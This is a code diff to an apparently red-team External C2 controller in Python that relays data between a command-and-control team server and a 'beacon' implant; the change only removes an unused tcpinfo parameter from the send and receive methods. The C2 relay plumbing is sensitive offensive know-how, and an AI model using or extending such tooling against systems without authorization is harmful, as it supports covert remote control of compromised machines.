@@ -83,10 +83,8 @@ class ExternalC2Controller:
             data += self._socketTS.recv(frame_length - len(data))
         return data
 
-    def sendToBeacon(self, tcpinfo, data):
+    def sendToBeacon(self, data):
         """
-        
-        :param tcpinfo: Class with user tcp info
         :param data: Data to send to beacon
         """
         frame = self.encode_frame(data)
@@ -98,10 +96,8 @@ class ExternalC2Controller:
         return None
 
 
-    def recvFromBeacon(self, tcpinfo):
+    def recvFromBeacon(self):
         """
-
-        :param tcpinfo: Class with user TCP info
         :return: data received from beacon
         """
         try:
@@ -172,7 +168,7 @@ class ExternalC2Controller:
         print("Start pipe dance")
         while True:
 
-            data = self.recvFromBeacon(tcpinfo)
+            data = self.recvFromBeacon()
             if data == None:
                 '''
                 print("Disconnected from beacon, likely due to sleep.")
@@ -194,7 +190,7 @@ class ExternalC2Controller:
 
             data = self.recv_from_ts()
             print("Received {} bytes from TS and sending to beacon".format(len(data)))
-            if (self.sendToBeacon(tcpinfo, data) == -1):
+            if (self.sendToBeacon(data) == -1):
                 break
         self._socketBeacon.close()
         self._socketServer.close()
